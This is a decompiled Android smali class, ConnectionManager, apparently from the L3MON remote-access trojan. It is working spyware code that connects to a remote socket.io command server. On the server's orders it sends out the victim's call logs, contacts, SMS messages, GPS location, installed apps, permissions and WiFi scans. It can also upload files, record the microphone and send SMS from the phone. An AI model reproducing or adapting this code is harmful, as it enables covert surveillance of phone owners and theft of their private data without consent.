.class public Lcom/etechd/l3mon/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# static fields
.field public static context:Landroid/content/Context;

.field private static fm:Lcom/etechd/l3mon/FileManager;

.field private static ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 17
    new-instance v0, Lcom/etechd/l3mon/FileManager;

    invoke-direct {v0}, Lcom/etechd/l3mon/FileManager;-><init>()V

    sput-object v0, Lcom/etechd/l3mon/ConnectionManager;->fm:Lcom/etechd/l3mon/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 12
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static CL()V
    .locals 4

    .line 142
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/etechd/l3mon/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xCL"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 143
    return-void
.end method

.method public static CO()V
    .locals 4

    .line 146
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/etechd/l3mon/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xCO"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 147
    return-void
.end method

.method public static FI(ILjava/lang/String;)V
    .locals 5
    .param p0, "req"    # I
    .param p1, "path"    # Ljava/lang/String;

    .line 120
    const-string v0, "list"

    const/4 v1, 0x1

    if-nez p0, :cond_0

    .line 121
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 123
    .local v2, "object":Lorg/json/JSONObject;
    :try_start_0
    const-string v3, "type"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 124
    sget-object v3, Lcom/etechd/l3mon/ConnectionManager;->fm:Lcom/etechd/l3mon/FileManager;

    invoke-static {p1}, Lcom/etechd/l3mon/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 125
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xFI"

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v2, v1, v4

    invoke-virtual {v0, v3, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 126
    :catch_0
    move-exception v0

    :goto_0
    goto :goto_1

    .line 127
    .end local v2    # "object":Lorg/json/JSONObject;
    :cond_0
    if-ne p0, v1, :cond_1

    .line 128
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->fm:Lcom/etechd/l3mon/FileManager;

    invoke-static {p1}, Lcom/etechd/l3mon/FileManager;->downloadFile(Ljava/lang/String;)V

    goto :goto_2

    .line 127
    :cond_1
    :goto_1
    nop

    .line 129
    :goto_2
    return-void
.end method

.method public static GP(Ljava/lang/String;)V
    .locals 5
    .param p0, "perm"    # Ljava/lang/String;

    .line 168
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 170
    .local v0, "data":Lorg/json/JSONObject;
    :try_start_0
    const-string v1, "permission"

    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 171
    const-string v1, "isAllowed"

    invoke-static {p0}, Lcom/etechd/l3mon/PermissionManager;->canIUse(Ljava/lang/String;)Z

    move-result v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 172
    sget-object v1, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v2, "0xGP"

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    invoke-virtual {v1, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 175
    goto :goto_0

    .line 173
    :catch_0
    move-exception v1

    .line 176
    :goto_0
    return-void
.end method

.method public static IN()V
    .locals 4

    .line 163
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-static {v2}, Lcom/etechd/l3mon/AppList;->getInstalledApps(Z)Lorg/json/JSONObject;

    move-result-object v3

    aput-object v3, v1, v2

    const-string v2, "0xIN"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 164
    return-void
.end method

.method public static LO()V
    .locals 5
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 179
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 180
    new-instance v0, Lcom/etechd/l3mon/LocManager;

    sget-object v1, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/etechd/l3mon/LocManager;-><init>(Landroid/content/Context;)V

    .line 182
    .local v0, "gps":Lcom/etechd/l3mon/LocManager;
    invoke-virtual {v0}, Lcom/etechd/l3mon/LocManager;->canGetLocation()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 183
    sget-object v1, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-virtual {v0}, Lcom/etechd/l3mon/LocManager;->getData()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v2, v3

    const-string v3, "0xLO"

    invoke-virtual {v1, v3, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 185
    :cond_0
    return-void
.end method

.method public static MI(I)V
    .locals 0
    .param p0, "sec"    # I
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 150
    invoke-static {p0}, Lcom/etechd/l3mon/MicManager;->startRecording(I)V

    .line 151
    return-void
.end method

.method public static PM()V
    .locals 4

    .line 158
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/etechd/l3mon/PermissionManager;->getGrantedPermissions()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xPM"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 159
    return-void
.end method

.method public static SM(ILjava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p0, "req"    # I
    .param p1, "phoneNo"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .line 133
    const/4 v0, 0x0

    const-string v1, "0xSM"

    const/4 v2, 0x1

    if-nez p0, :cond_0

    .line 134
    sget-object v3, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {}, Lcom/etechd/l3mon/SMSManager;->getsms()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v2, v0

    invoke-virtual {v3, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    .line 135
    :cond_0
    if-ne p0, v2, :cond_1

    .line 136
    invoke-static {p1, p2}, Lcom/etechd/l3mon/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    .line 137
    .local v3, "isSent":Z
    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v2, v0

    invoke-virtual {v4, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 139
    .end local v3    # "isSent":Z
    :cond_1
    :goto_0
    return-void
.end method

.method public static WI()V
    .locals 4

    .line 154
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v2}, Lcom/etechd/l3mon/WifiScanner;->scan(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xWI"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 155
    return-void
.end method

.method static synthetic access$000()Lio/socket/client/Socket;
    .locals 1

    .line 12
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method

.method public static sendReq()V
    .locals 3

    .line 32
    :try_start_0
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

    .line 33
    return-void

    .line 34
    :cond_0
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    sput-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    .line 35
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "ping"

    new-instance v2, Lcom/etechd/l3mon/ConnectionManager$1;

    invoke-direct {v2}, Lcom/etechd/l3mon/ConnectionManager$1;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 44
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "order"

    new-instance v2, Lcom/etechd/l3mon/ConnectionManager$2;

    invoke-direct {v2}, Lcom/etechd/l3mon/ConnectionManager$2;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 101
    sget-object v0, Lcom/etechd/l3mon/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 105
    goto :goto_0

    .line 103
    :catch_0
    move-exception v0

    .line 104
    .local v0, "ex":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    const-string v2, "error"

    invoke-static {v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 107
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 1
    .param p0, "con"    # Landroid/content/Context;

    .line 22
    :try_start_0
    sput-object p0, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;

    .line 23
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 26
    goto :goto_0

    .line 24
    :catch_0
    move-exception v0

    .line 25
    .local v0, "ex":Ljava/lang/Exception;
    invoke-static {p0}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 28
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_0
    return-void
.end method
